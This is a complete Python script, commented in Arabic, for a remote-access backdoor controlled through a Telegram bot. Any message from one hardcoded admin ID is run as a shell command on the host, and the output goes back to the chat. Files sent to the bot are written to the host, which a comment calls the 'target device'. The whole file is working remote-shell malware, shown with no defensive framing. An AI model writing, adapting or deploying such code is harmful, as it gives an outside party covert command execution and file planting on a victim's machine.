import time
import os
import subprocess
import requests

TOKEN    = "YOUR_BOT_TOKEN"          # توكن البوت
ADMIN_ID = 2086562822                # معرفك أنت فقط (المالك)

URL  = f"https://api.telegram.org/bot{TOKEN}"
CWD  = os.path.expanduser("~")       # مجلد البداية
ALIVE = True                         # تحكم في إيقاف العملية

def get_updates(offset=None):
    try:
        r = requests.get(f"{URL}/getUpdates",
                         params={"timeout": 30, "offset": offset}, timeout=35)
        return r.json()
    except Exception:
        return None

def send(chat_id, text):
    try:
        requests.post(f"{URL}/sendMessage",
                      json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception:
        pass

def send_file(chat_id, path):
    try:
        requests.post(f"{URL}/sendDocument",
                      data={"chat_id": chat_id},
                      files={"document": open(path, "rb")})
    except Exception as e:
        send(chat_id, f"تعذّر إرسال الملف: {e}")

def download_from_telegram(chat_id, file_id, dest):
    # رفع ملف من تيليغرام (بصورته/مستنده) إلى الجهاز الهدف
    try:
        f = requests.get(f"{URL}/getFile", params={"file_id": file_id}).json()
        path = f["result"]["file_path"]
        content = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}")
        with open(dest, "wb") as fp:
            fp.write(content.content)
        send(chat_id, f"تم الحفظ في: `{dest}`")
    except Exception as e:
        send(chat_id, f"فشل التنزيل: {e}")

def exec_cmd(cmd):
    global CWD
    try:
        parts = cmd.split(None, 1)
        base = parts[0].lower()

        if base == "cd":
            d = parts[1].strip() if len(parts) > 1 else os.path.expanduser("~")
            os.chdir(os.path.abspath(os.path.join(CWD, d)))
            CWD = os.getcwd()
            return f"المجلد الحالي: {CWD}"

        if base == "pwd":
            return CWD

        if base in ("exit", "shutdown"):
            # قفلة العملية عن بعد
            global ALIVE
            ALIVE = False
            return "تم إيقاف العملية."

        # تنفيذ أي أمر آخر في CWD الحالي
        proc = subprocess.run(cmd, shell=True, capture_output=True,
                              text=True, cwd=CWD, timeout=120)
        return (proc.stdout + proc.stderr) or "تم بنجاح (لا مخرجات)."
    except subprocess.TimeoutExpired:
        return "انتهت مهلة التنفيذ (أكثر من 120 ثانية)."
    except Exception as e:
        return f"خطأ: {e}"

def handle(chat_id, user_id, msg):
    global ALIVE
    if user_id != ADMIN_ID:
        send(chat_id, "غير مصرّح.")
        return

    text = msg.get("text", "")
    if not text.strip():
        return

    # أوامر تحكم خاصة بالبوت (لا تُنفَّذ في الصدفة)
    if text.startswith("/"):
        parts = text.split(None, 1)
        c, arg = parts[0], (parts[1] if len(parts) > 1 else "").strip()
        if c == "/cd" and arg:
            return send(chat_id, exec_cmd("cd " + arg))
        if c == "/pwd":
            return send(chat_id, exec_cmd("pwd"))
        if c == "/kill":
            ALIVE = False
            return send(chat_id, "أوقفت العملية.")
        if c == "/help":
            return send(chat_id,
                "الأوامر:\n"
                "`/pwd`  المجلد الحالي\n"
                "`/cd dir`  تغيير المجلد\n"
                "`/kill`  إيقاف العملية\n"
                "أي نص آخر يُنفَّذ كأمر في الصدفة.\n"
                "أرسل **مستنداً** لرفعه إلى مجلد العمل الحالي."
            )
        # لو أمر غير معروف نرسله للصدفة (ما نهمله)
        # مع إزالة الشرطة الزائدة قد يضر، فنسأل المستخدم أولاً — نرسله مباشرة:
        return send(chat_id, exec_cmd(text[1:]))

    # أمر صدفة عادي
    output = exec_cmd(text)
    if len(output) > 4000:
        output = output[:4000] + "\n[... تم القطع ...]"
    send(chat_id, f"```\n$ {text}\n{output}\n```")

def main():
    global ALIVE, CWD
    offset = None
    while ALIVE:
        data = get_updates(offset)
        if data and data.get("result"):
            for u in data["result"]:
                offset = u["update_id"] + 1
                m = u.get("message")
                if not m:
                    continue
                chat_id = m["chat"]["id"]
                user_id = m["from"]["id"]

                # استقبال ملف مرفوع إلى البوت → رفعه إلى CWD الحالي
                doc = m.get("document")
                if doc and user_id == ADMIN_ID:
                    dest = os.path.join(CWD, doc["file_name"])
                    download_from_telegram(chat_id, doc["file_id"], dest)
                    continue

                handle(chat_id, user_id, m)
        time.sleep(2)

if __name__ == "__main__":
    main()
